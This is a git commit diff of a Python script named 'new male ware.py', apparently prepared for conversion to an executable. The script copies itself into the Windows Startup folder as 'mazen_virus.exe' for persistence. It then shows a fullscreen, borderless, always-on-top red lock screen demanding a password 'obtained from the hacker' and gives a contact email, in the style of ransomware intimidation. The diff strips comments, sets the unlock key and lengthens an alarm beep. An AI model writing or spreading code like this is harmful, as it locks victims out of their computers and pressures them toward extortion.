58742c46b17726bebb33d1c6effd80565d5b3590
eroge-69 <erogexunamed@gmail.com>
2025-08-14 03:03:07 +0700

    Upload new male ware.py via PY to EXE tool

--- python-files/new male ware.py
+++ python-files/new male ware.py
@@ -6,47 +6,47 @@ import os
 import sys
 import shutil
 
-# الحصول على المسار الكامل للتطبيق الحالي
+
 path_app = os.path.abspath(sys.argv[0])
 
-# تحديد مسار مجلد Startup
+
 startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-# تحديد اسم الملف في مجلد Startup
+
 startup_file = os.path.join(startup_path, "mazen_virus.exe")
 
-# التحقق من وجود الملف ونسخه إذا لم يكن موجودًا
+
 if not os.path.exists(startup_file):
     try:
         shutil.copy(path_app, startup_file)
     except Exception as e:
         print(f"Failed to copy file to startup: {e}")
 
-# إنشاء النافذة الرئيسية
+
 root = tk.Tk()
 
-# دالة الخروج من التطبيق
+
 def exit_app():
     root.destroy()
 
-# دالة التحقق من كلمة المرور
+
 def check_password():
-    key = "D3FAULT2012@@"
+    key = "1234"
     if entry.get() == key:
         messagebox.showinfo("Success", "Password is correct!")
         exit_app()
     else:
-        # تشغيل صوت تنبيه
-        winsound.Beep(1000, 500)  # تم تقليل مدة الصوت إلى 0.5 ثانية
+
+        winsound.Beep(2000, 5000)  # تم تقليل مدة الصوت إلى 0.5 ثانية
         messagebox.showerror("don't play with me", "If you need the password, connect with me")
 
-# إعدادات النافذة
+
 root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
 root.overrideredirect(True)
 root.attributes("-topmost", True)
 root.config(background="red")
 root.title("Enter the password")
 
-# واجهة المستخدم
+
 tk.Label(root, text="Enter the password you obtained from the hacker", bg="red", fg="white", font=("Arial", 14)).pack(pady=20)
 entry = tk.Entry(root, width=50, bd=0, font=("Arial", 12))
 entry.pack(pady=5)
@@ -54,7 +54,7 @@ b = tk.Button(root, text="enter to your device", command=check_password, font=("
 b.pack(pady=10)
 tk.Label(root, text="d3fualt01@gmail.com", bg="red", fg="white", font=("Arial", 10)).place(x=450, y=600)
 
-# منع تغيير حجم النافذة
+
 root.resizable(False, False)
 
 
